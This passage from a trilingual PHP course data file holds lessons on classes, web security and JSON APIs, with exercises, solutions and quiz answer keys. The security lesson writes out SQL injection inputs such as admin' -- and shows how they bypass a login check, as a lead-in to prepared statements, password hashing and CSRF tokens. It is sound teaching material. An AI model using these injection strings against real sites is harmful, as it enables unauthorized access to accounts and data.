      answerIndex: 1,
      explanation: {
        fr: 'Après la redirection, la dernière requête est un GET : recharger la page ne refait pas l’INSERT, il n’y a donc pas de doublon.',
        en: 'After the redirect, the last request is a GET: reloading doesn’t redo the INSERT, so there is no duplicate.',
        tr: 'Yönlendirmeden sonra son istek bir GET’tir: yenilemek INSERT’i tekrarlamaz, yani kopya oluşmaz.',
      },
    },
  },
  {
    id: 'php-w12-oop',
    week: 12,
    title: { fr: 'PHP orienté objet', en: 'Object oriented PHP', tr: 'Nesne yönelimli PHP' },
    blocks: [
      {
        type: 'text',
        text: {
          fr: 'PHP a des classes comme Java : propriétés, méthodes, constructeur (__construct), visibilité (public, protected, private), héritage avec extends, interfaces. On accède aux membres avec -> et à l’objet courant avec $this. Depuis PHP 8, la promotion de propriétés dans le constructeur évite de les déclarer deux fois. Les frameworks (Laravel, Symfony) sont entièrement orientés objet.',
          en: 'PHP has classes like Java: properties, methods, constructor (__construct), visibility (public, protected, private), inheritance with extends, interfaces. Members are reached with -> and the current object with $this. Since PHP 8, constructor property promotion avoids declaring properties twice. Frameworks (Laravel, Symfony) are fully object oriented.',
          tr: 'PHP’de Java’daki gibi sınıflar vardır: özellikler, metotlar, yapıcı (__construct), görünürlük (public, protected, private), extends ile kalıtım, arayüzler. Üyelere -> ile, o anki nesneye $this ile erişilir. PHP 8’den beri yapıcıda özellik tanıtımı, özellikleri iki kez bildirmeyi önler. Çatılar (Laravel, Symfony) tamamen nesne yönelimlidir.',
        },
      },
      {
        type: 'code',
        code: {
          fr: 'class Student {\n    public function __construct(\n        public string $name,\n        private int $year = 1,             // promotion de propriétés (PHP 8)\n    ) {}\n\n    public function promote(): void {\n        if ($this->year < 4) $this->year++;\n    }\n\n    public function __toString(): string {   // utilisé par echo\n        return "$this->name ($this->year)";\n    }\n}\n\n$s = new Student("Can");\n$s->promote();\n$s->promote();\necho $s;                                   // Can (3)\n\nclass GradStudent extends Student { /* … */ }',
          en: 'class Student {\n    public function __construct(\n        public string $name,\n        private int $year = 1,             // property promotion (PHP 8)\n    ) {}\n\n    public function promote(): void {\n        if ($this->year < 4) $this->year++;\n    }\n\n    public function __toString(): string {   // used by echo\n        return "$this->name ($this->year)";\n    }\n}\n\n$s = new Student("Can");\n$s->promote();\n$s->promote();\necho $s;                                   // Can (3)\n\nclass GradStudent extends Student { /* … */ }',
          tr: 'class Student {\n    public function __construct(\n        public string $name,\n        private int $year = 1,             // özellik tanıtımı (PHP 8)\n    ) {}\n\n    public function promote(): void {\n        if ($this->year < 4) $this->year++;\n    }\n\n    public function __toString(): string {   // echo tarafından kullanılır\n        return "$this->name ($this->year)";\n    }\n}\n\n$s = new Student("Can");\n$s->promote();\n$s->promote();\necho $s;                                   // Can (3)\n\nclass GradStudent extends Student { /* … */ }',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: '(1) $e = new Student("Emre", 4); $e->promote(); echo $e; affiche quoi ? (2) Que se passe-t-il avec $e->year = 9; écrit hors de la classe ? (3) Et avec echo $e->name; ?',
          en: '(1) $e = new Student("Emre", 4); $e->promote(); echo $e; prints what? (2) What happens with $e->year = 9; written outside the class? (3) And with echo $e->name;?',
          tr: '(1) $e = new Student("Emre", 4); $e->promote(); echo $e; ne yazdırır? (2) Sınıf dışında $e->year = 9; yazılırsa ne olur? (3) echo $e->name; ile ne olur?',
        },
        solution: {
          fr: '(1) « Emre (4) » : year vaut déjà 4, la condition $this->year < 4 est fausse et rien ne change. (2) Erreur fatale « Cannot modify private property » : year est private, on ne peut la changer que par promote(), qui respecte la limite de 4 ans. (3) « Emre » : name est public.',
          en: '(1) “Emre (4)”: year is already 4, the condition $this->year < 4 is false and nothing changes. (2) Fatal error “Cannot modify private property”: year is private, it can only change through promote(), which respects the 4-year limit. (3) “Emre”: name is public.',
          tr: '(1) “Emre (4)”: year zaten 4’tür, $this->year < 4 koşulu yanlıştır ve hiçbir şey değişmez. (2) “Cannot modify private property” ölümcül hatası: year private’tır, yalnızca 4 yıl sınırına uyan promote() ile değişebilir. (3) “Emre”: name public’tir.',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Comment appelle-t-on la méthode promote sur l’objet $s en PHP ?',
        en: 'How is the promote method called on object $s in PHP?',
        tr: 'PHP’de $s nesnesinde promote metodu nasıl çağrılır?',
      },
      options: { fr: ['$s.promote()', '$s->promote()', '$s::promote()'], en: ['$s.promote()', '$s->promote()', '$s::promote()'], tr: ['$s.promote()', '$s->promote()', '$s::promote()'] },
      answerIndex: 1,
      explanation: {
        fr: 'En PHP, -> accède aux membres d’un objet ; le point sert à la concaténation, et :: aux membres static.',
        en: 'In PHP, -> reaches an object’s members; the dot is for concatenation, and :: for static members.',
        tr: 'PHP’de -> bir nesnenin üyelerine erişir; nokta birleştirme için, :: ise static üyeler içindir.',
      },
    },
  },
  {
    id: 'php-w13-security',
    week: 13,
    title: {
      fr: 'Sécurité : injection SQL, mots de passe, CSRF',
      en: 'Security: SQL injection, passwords, CSRF',
      tr: 'Güvenlik: SQL enjeksiyonu, parolalar, CSRF',
    },
    blocks: [
      {
        type: 'code',
        code: {
          fr: '// INJECTION SQL : la donnée devient du code\n$nom = $_POST["nom"];                      // l’attaquant tape : x\' OR \'1\'=\'1\n$sql = "SELECT * FROM users WHERE name = \'$nom\'";\n// → SELECT * FROM users WHERE name = \'x\' OR \'1\'=\'1\'   (toutes les lignes !)\n// Solution : requêtes préparées (semaine 10)\n\n// MOTS DE PASSE : jamais en clair, jamais md5 ou sha1\n$hash = password_hash($mdp, PASSWORD_DEFAULT);      // bcrypt + sel aléatoire\npassword_verify("secret", $hash);                   // true / false\n\n// CSRF : un autre site fait envoyer un formulaire par ton navigateur\n$_SESSION["csrf"] ??= bin2hex(random_bytes(32));\n// <input type="hidden" name="csrf" value="<?= $_SESSION[\'csrf\'] ?>">\nif (!hash_equals($_SESSION["csrf"], $_POST["csrf"] ?? "")) { http_response_code(403); exit; }',
          en: '// SQL INJECTION: data becomes code\n$name = $_POST["name"];                    // the attacker types: x\' OR \'1\'=\'1\n$sql = "SELECT * FROM users WHERE name = \'$name\'";\n// → SELECT * FROM users WHERE name = \'x\' OR \'1\'=\'1\'   (every row!)\n// Fix: prepared statements (week 10)\n\n// PASSWORDS: never plain text, never md5 or sha1\n$hash = password_hash($pwd, PASSWORD_DEFAULT);      // bcrypt + random salt\npassword_verify("secret", $hash);                   // true / false\n\n// CSRF: another site makes your browser submit a form\n$_SESSION["csrf"] ??= bin2hex(random_bytes(32));\n// <input type="hidden" name="csrf" value="<?= $_SESSION[\'csrf\'] ?>">\nif (!hash_equals($_SESSION["csrf"], $_POST["csrf"] ?? "")) { http_response_code(403); exit; }',
          tr: '// SQL ENJEKSİYONU: veri koda dönüşür\n$ad = $_POST["ad"];                        // saldırgan yazar: x\' OR \'1\'=\'1\n$sql = "SELECT * FROM users WHERE name = \'$ad\'";\n// → SELECT * FROM users WHERE name = \'x\' OR \'1\'=\'1\'   (tüm satırlar!)\n// Çözüm: hazırlanmış sorgular (10. hafta)\n\n// PAROLALAR: asla düz metin, asla md5 veya sha1\n$hash = password_hash($parola, PASSWORD_DEFAULT);   // bcrypt + rastgele tuz\npassword_verify("secret", $hash);                   // true / false\n\n// CSRF: başka bir site tarayıcına form gönderttirir\n$_SESSION["csrf"] ??= bin2hex(random_bytes(32));\n// <input type="hidden" name="csrf" value="<?= $_SESSION[\'csrf\'] ?>">\nif (!hash_equals($_SESSION["csrf"], $_POST["csrf"] ?? "")) { http_response_code(403); exit; }',
        },
      },
      {
        type: 'text',
        text: {
          fr: 'Résumé des défenses : requêtes préparées contre l’injection SQL ; htmlspecialchars contre le XSS ; password_hash / password_verify pour les mots de passe ; jeton CSRF dans chaque formulaire POST ; session_regenerate_id après connexion ; HTTPS partout ; pas d’affichage des erreurs en production.',
          en: 'Defense summary: prepared statements against SQL injection; htmlspecialchars against XSS; password_hash / password_verify for passwords; a CSRF token in every POST form; session_regenerate_id after login; HTTPS everywhere; no error display in production.',
          tr: 'Savunma özeti: SQL enjeksiyonuna karşı hazırlanmış sorgular; XSS’e karşı htmlspecialchars; parolalar için password_hash / password_verify; her POST formunda CSRF jetonu; girişten sonra session_regenerate_id; her yerde HTTPS; canlı ortamda hata gösterimi yok.',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: '(1) Un formulaire de connexion construit "SELECT * FROM users WHERE name = \'$nom\' AND pass = \'$mdp\'". Que donne la requête si on tape admin\' -- comme nom ? (2) On appelle deux fois password_hash("secret") : les deux hachages sont-ils identiques ? password_verify("Secret", $hash) renvoie quoi ?',
          en: '(1) A login form builds "SELECT * FROM users WHERE name = \'$name\' AND pass = \'$pwd\'". What does the query become if admin\' -- is typed as the name? (2) password_hash("secret") is called twice: are the two hashes identical? What does password_verify("Secret", $hash) return?',
          tr: '(1) Bir giriş formu "SELECT * FROM users WHERE name = \'$ad\' AND pass = \'$parola\'" oluşturuyor. Ad olarak admin\' -- yazılırsa sorgu ne olur? (2) password_hash("secret") iki kez çağrılıyor: iki özet aynı mıdır? password_verify("Secret", $hash) ne döndürür?',
        },
        solution: {
          fr: '(1) SELECT * FROM users WHERE name = \'admin\' -- \' AND pass = \'…\' : « -- » commence un commentaire SQL, la vérification du mot de passe disparaît, et l’attaquant est connecté comme admin. (2) Non : chaque appel choisit un sel aléatoire, donc deux hachages différents, mais password_verify("secret", …) est vrai pour les deux. password_verify("Secret", $hash) renvoie false : la casse compte.',
          en: '(1) SELECT * FROM users WHERE name = \'admin\' -- \' AND pass = \'…\': “--” starts an SQL comment, the password check disappears, and the attacker is logged in as admin. (2) No: each call picks a random salt, so two different hashes, but password_verify("secret", …) is true for both. password_verify("Secret", $hash) returns false: case matters.',
          tr: '(1) SELECT * FROM users WHERE name = \'admin\' -- \' AND pass = \'…\': “--” bir SQL yorumu başlatır, parola denetimi kaybolur ve saldırgan admin olarak girer. (2) Hayır: her çağrı rastgele bir tuz seçer, yani iki farklı özet olur, ama password_verify("secret", …) ikisi için de doğrudur. password_verify("Secret", $hash) false döndürür: büyük-küçük harf önemlidir.',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Comment faut-il stocker les mots de passe des utilisateurs ?',
        en: 'How should user passwords be stored?',
        tr: 'Kullanıcı parolaları nasıl saklanmalıdır?',
      },
      options: {
        fr: ['En clair', 'Avec md5($mdp)', 'Avec password_hash($mdp, PASSWORD_DEFAULT)'],
        en: ['As plain text', 'With md5($pwd)', 'With password_hash($pwd, PASSWORD_DEFAULT)'],
        tr: ['Düz metin olarak', 'md5($parola) ile', 'password_hash($parola, PASSWORD_DEFAULT) ile'],
      },
      answerIndex: 2,
      explanation: {
        fr: 'password_hash utilise un algorithme lent et salé (bcrypt), conçu pour résister aux attaques. md5 est beaucoup trop rapide et se casse en quelques secondes avec des tables précalculées.',
        en: 'password_hash uses a slow, salted algorithm (bcrypt) built to resist attacks. md5 is far too fast and cracks in seconds with precomputed tables.',
        tr: 'password_hash saldırılara dayanacak şekilde tasarlanmış yavaş ve tuzlu bir algoritma (bcrypt) kullanır. md5 çok hızlıdır ve önceden hesaplanmış tablolarla saniyeler içinde kırılır.',
      },
    },
  },
  {
    id: 'php-w14-json-api',
    week: 14,
    title: {
      fr: 'API JSON, AJAX et révision du final',
      en: 'JSON APIs, AJAX and final review',
      tr: 'JSON API’leri, AJAX ve final tekrarı',
    },
    blocks: [
      {
        type: 'text',
        text: {
          fr: 'Une application moderne (page dynamique, application mobile) ne demande pas du HTML au serveur mais des données en JSON. Le script PHP envoie l’en-tête Content-Type: application/json et renvoie json_encode($donnees). Côté navigateur, JavaScript appelle l’API avec fetch et met à jour la page sans la recharger : c’est l’AJAX.',
          en: 'A modern app (dynamic page, mobile app) doesn’t ask the server for HTML but for JSON data. The PHP script sends the Content-Type: application/json header and returns json_encode($data). In the browser, JavaScript calls the API with fetch and updates the page without reloading it: that is AJAX.',
          tr: 'Modern bir uygulama (dinamik sayfa, mobil uygulama) sunucudan HTML değil JSON verisi ister. PHP betiği Content-Type: application/json başlığını gönderir ve json_encode($veri) döndürür. Tarayıcıda JavaScript API’yi fetch ile çağırır ve sayfayı yenilemeden günceller: bu AJAX’tır.',
        },
      },
      {
        type: 'code',
        code: {
          fr: '<?php // api/student.php\nheader("Content-Type: application/json");\n$etudiant = ["name" => "Ali", "grades" => [85, 70], "active" => true];\necho json_encode($etudiant);\n// {"name":"Ali","grades":[85,70],"active":true}\n\n$o = json_decode(\'{"name":"Ayse","year":1}\');          // objet : $o->name\n$t = json_decode(\'{"name":"Ayse","year":1}\', true);    // tableau : $t["year"]\n\n// JavaScript dans la page\nconst rep = await fetch("api/student.php");\nconst data = await rep.json();\ndocument.querySelector("#nom").textContent = data.name;',
          en: '<?php // api/student.php\nheader("Content-Type: application/json");\n$student = ["name" => "Ali", "grades" => [85, 70], "active" => true];\necho json_encode($student);\n// {"name":"Ali","grades":[85,70],"active":true}\n\n$o = json_decode(\'{"name":"Ayse","year":1}\');          // object: $o->name\n$t = json_decode(\'{"name":"Ayse","year":1}\', true);    // array: $t["year"]\n\n// JavaScript in the page\nconst res = await fetch("api/student.php");\nconst data = await res.json();\ndocument.querySelector("#name").textContent = data.name;',
          tr: '<?php // api/student.php\nheader("Content-Type: application/json");\n$ogrenci = ["name" => "Ali", "grades" => [85, 70], "active" => true];\necho json_encode($ogrenci);\n// {"name":"Ali","grades":[85,70],"active":true}\n\n$o = json_decode(\'{"name":"Ayse","year":1}\');          // nesne: $o->name\n$t = json_decode(\'{"name":"Ayse","year":1}\', true);    // dizi: $t["year"]\n\n// Sayfadaki JavaScript\nconst yanit = await fetch("api/student.php");\nconst veri = await yanit.json();\ndocument.querySelector("#ad").textContent = veri.name;',
        },
      },
      { type: 'heading', text: { fr: 'Révision du final', en: 'Final review', tr: 'Final tekrarı' } },
      {
        type: 'code',
        code: {
          fr: '✔ Sessions (session_start, $_SESSION, regenerate, destroy) et cookies\n✔ Fichiers : file_put_contents, FILE_APPEND, file, explode ; $_FILES et sécurité\n✔ PDO : connexion, prepare / execute, fetchAll, lastInsertId, rowCount\n✔ CRUD, require_once, Post/Redirect/Get\n✔ Classes PHP : __construct, promotion, ->, $this, visibilité, __toString\n✔ Sécurité : injection SQL, XSS, password_hash, CSRF, HTTPS\n✔ JSON : json_encode / json_decode, en-tête, fetch en JavaScript',
          en: '✔ Sessions (session_start, $_SESSION, regenerate, destroy) and cookies\n✔ Files: file_put_contents, FILE_APPEND, file, explode; $_FILES and security\n✔ PDO: connection, prepare / execute, fetchAll, lastInsertId, rowCount\n✔ CRUD, require_once, Post/Redirect/Get\n✔ PHP classes: __construct, promotion, ->, $this, visibility, __toString\n✔ Security: SQL injection, XSS, password_hash, CSRF, HTTPS\n✔ JSON: json_encode / json_decode, header, fetch in JavaScript',
          tr: '✔ Oturumlar (session_start, $_SESSION, regenerate, destroy) ve çerezler\n✔ Dosyalar: file_put_contents, FILE_APPEND, file, explode; $_FILES ve güvenlik\n✔ PDO: bağlantı, prepare / execute, fetchAll, lastInsertId, rowCount\n✔ CRUD, require_once, Post/Redirect/Get\n✔ PHP sınıfları: __construct, tanıtım, ->, $this, görünürlük, __toString\n✔ Güvenlik: SQL enjeksiyonu, XSS, password_hash, CSRF, HTTPS\n✔ JSON: json_encode / json_decode, başlık, JavaScript’te fetch',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: '(1) Que renvoie json_encode(["ok" => false, "count" => 0, "items" => []]) ? (2) Dans le code ci-dessus, que valent $o->name et $t["year"] ? (3) Écris l’API PHP qui renvoie en JSON la liste des noms d’étudiants d’une ville passée en GET (?city=…), avec PDO.',
          en: '(1) What does json_encode(["ok" => false, "count" => 0, "items" => []]) return? (2) In the code above, what are $o->name and $t["year"]? (3) Write the PHP API that returns, as JSON, the names of students from a city given in GET (?city=…), with PDO.',
          tr: '(1) json_encode(["ok" => false, "count" => 0, "items" => []]) ne döndürür? (2) Yukarıdaki kodda $o->name ve $t["year"] nedir? (3) GET ile verilen bir şehirdeki (?city=…) öğrencilerin adlarını JSON olarak döndüren PHP API’sini PDO ile yaz.',
        },
        solution: {
          fr: '(1) {"ok":false,"count":0,"items":[]}. (2) "Ayse" et 1. (3) require_once "db.php"; header("Content-Type: application/json"); $q = $pdo->prepare("SELECT name FROM student WHERE city = ?"); $q->execute([$_GET["city"] ?? ""]); echo json_encode($q->fetchAll(PDO::FETCH_COLUMN));. Avec Karabuk, le résultat serait ["Ali","Emre"].',
          en: '(1) {"ok":false,"count":0,"items":[]}. (2) "Ayse" and 1. (3) require_once "db.php"; header("Content-Type: application/json"); $q = $pdo->prepare("SELECT name FROM student WHERE city = ?"); $q->execute([$_GET["city"] ?? ""]); echo json_encode($q->fetchAll(PDO::FETCH_COLUMN));. With Karabuk, the result would be ["Ali","Emre"].',
          tr: '(1) {"ok":false,"count":0,"items":[]}. (2) "Ayse" ve 1. (3) require_once "db.php"; header("Content-Type: application/json"); $q = $pdo->prepare("SELECT name FROM student WHERE city = ?"); $q->execute([$_GET["city"] ?? ""]); echo json_encode($q->fetchAll(PDO::FETCH_COLUMN));. Karabuk ile sonuç ["Ali","Emre"] olurdu.',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Quelle fonction transforme un tableau PHP en texte JSON ?',
        en: 'Which function turns a PHP array into JSON text?',
        tr: 'Hangi fonksiyon bir PHP dizisini JSON metnine dönüştürür?',
      },
      options: { fr: ['json_decode', 'json_encode', 'serialize'], en: ['json_decode', 'json_encode', 'serialize'], tr: ['json_decode', 'json_encode', 'serialize'] },
      answerIndex: 1,
      explanation: {
        fr: 'json_encode : PHP → JSON. json_decode : JSON → PHP. serialize produit un format propre à PHP, que JavaScript ne comprend pas.',
        en: 'json_encode: PHP → JSON. json_decode: JSON → PHP. serialize produces a PHP-only format that JavaScript doesn’t understand.',
        tr: 'json_encode: PHP → JSON. json_decode: JSON → PHP. serialize, JavaScript’in anlamadığı PHP’ye özgü bir biçim üretir.',
      },
    },
  },
];
